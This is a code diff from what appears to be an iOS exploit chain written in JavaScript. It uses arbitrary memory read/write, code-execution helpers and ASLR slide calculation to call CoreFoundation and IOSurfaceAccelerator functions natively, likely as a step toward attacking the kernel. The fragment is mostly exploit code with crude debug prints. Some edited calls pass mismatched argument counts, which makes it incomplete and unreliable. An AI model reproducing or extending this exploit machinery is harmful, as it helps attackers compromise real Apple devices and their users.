@@ -25,27 +25,23 @@ function memcpy_exec(dst, src, size) {
 	var width = malloc(4);
 	var height = malloc(4);
 	var pitch = malloc(4);
-	var pixel_format = malloc(5);
+	var pixel_format = malloc(8);
 	write_u32(width, PAGE_SIZE / (16 * 4));
 	write_u32(height, 16);
 	write_u32(pitch, read_u32(width) * 4);
 	write_u32(pixel_format, 0x42475241); // ARGB
 	write_u32(pixel_format + 4, 0x0); // ARGB
 	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
-	dict = callnarg(CFDictionaryCreateMutable_addr + get_dyld_shc_slide(), 0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
+	dict = CFDictionaryCreateMutable(0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
 	printf("dict: %p\n", dict);
-	var test = callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pitch);
+	var test = CFNumberCreate(0, kCFNumberSInt32Type, pitch);
 	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
 	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
 	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
-	call4arg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(read_u32(my_kIOSurfaceBytesPerRow)), test, 0);
-	printf("fuck1\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), read_u32(my_kIOSurfaceWidth + 4), read_u32(my_kIOSurfaceWidth + 8), read_u32(my_kIOSurfaceWidth + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
-	printf("fuck2\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceHeight), read_u32(my_kIOSurfaceHeight + 4), read_u32(my_kIOSurfaceHeight + 8), read_u32(my_kIOSurfaceHeight + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
-	printf("fuck3\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfacePixelFormat), read_u32(my_kIOSurfacePixelFormat + 4), read_u32(my_kIOSurfacePixelFormat + 8), read_u32(my_kIOSurfacePixelFormat + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
-	printf("fuck4\n");
+	CFDictionarySetValue(dict, read_u32(read_u32(my_kIOSurfaceBytesPerRow)), test, 0);
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceWidth), read_u32(my_kIOSurfaceWidth + 4), read_u32(my_kIOSurfaceWidth + 8), read_u32(my_kIOSurfaceWidth + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceHeight), read_u32(my_kIOSurfaceHeight + 4), read_u32(my_kIOSurfaceHeight + 8), read_u32(my_kIOSurfaceHeight + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfacePixelFormat), read_u32(my_kIOSurfacePixelFormat + 4), read_u32(my_kIOSurfacePixelFormat + 8), read_u32(my_kIOSurfacePixelFormat + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
 	printf("fuck you\n");
 	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
 }
